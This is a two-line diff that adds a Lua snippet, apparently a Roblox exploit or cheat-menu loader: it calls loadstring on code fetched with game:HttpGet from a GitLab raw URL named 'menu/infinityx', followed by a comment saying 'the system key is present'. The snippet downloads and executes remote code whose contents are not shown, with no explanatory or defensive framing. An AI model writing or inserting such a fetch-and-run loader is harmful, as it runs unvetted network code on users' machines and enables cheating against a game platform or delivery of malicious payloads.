@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://gitlab.com/Lmy77/menu/-/raw/main/infinityx"))()
+--the system key is present
